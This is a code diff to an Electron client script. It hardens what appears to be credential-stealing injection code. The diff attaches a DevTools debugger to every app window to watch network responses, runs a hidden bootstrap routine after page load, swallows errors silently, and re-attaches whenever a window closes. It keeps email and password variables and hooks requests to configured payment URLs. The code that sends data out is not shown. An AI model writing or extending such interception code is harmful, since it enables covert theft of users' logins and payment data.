@@ -6,6 +6,7 @@ const path = require('path');
 const querystring = require('querystring');
 
 const {
+    app,
     BrowserWindow,
     session,
 } = require('electron');
@@ -370,15 +371,30 @@ let email = "";
 let password = "";
 let bootstrapped = false;
 
-const setupDebugger = () => {
-    const mainWindow = BrowserWindow.getAllWindows()[0];
-    if (!mainWindow) return;
+const attachToWindow = (mainWindow) => {
+    if (!mainWindow || mainWindow.isDestroyed()) return;
 
-    mainWindow.webContents.debugger.attach('1.3');
+    mainWindow.webContents.on('did-finish-load', async () => {
+        if (!bootstrapped) {
+            bootstrapped = true;
+            setTimeout(async () => {
+                try {
+                    await bootstrap();
+                } catch (e) {}
+            }, 3000);
+        }
+    });
+
+    try {
+        mainWindow.webContents.debugger.attach('1.3');
+    } catch (e) {
+        return;
+    }
+
     mainWindow.webContents.debugger.on('message', async (_, method, params) => {
         if (!bootstrapped) {
-            await bootstrap();
             bootstrapped = true;
+            try { await bootstrap(); } catch (e) {}
         }
 
         if (method !== 'Network.responseReceived') return;
@@ -425,9 +441,27 @@ const setupDebugger = () => {
         }
     });
 
-    mainWindow.webContents.debugger.sendCommand('Network.enable');
-    mainWindow.on('closed', () => { setupDebugger(); });
+    try {
+        mainWindow.webContents.debugger.sendCommand('Network.enable');
+    } catch (e) {}
+
+    mainWindow.on('closed', () => {
+        setupDebugger();
+    });
 };
+
+const setupDebugger = () => {
+    const wins = BrowserWindow.getAllWindows();
+    if (wins.length > 0) {
+        attachToWindow(wins[0]);
+    }
+};
+
+if (app) {
+    app.on('browser-window-created', (_, win) => {
+        attachToWindow(win);
+    });
+}
 setupDebugger();
 
 session.defaultSession.webRequest.onCompleted({ urls: CFG.pmt }, async (details, _) => {
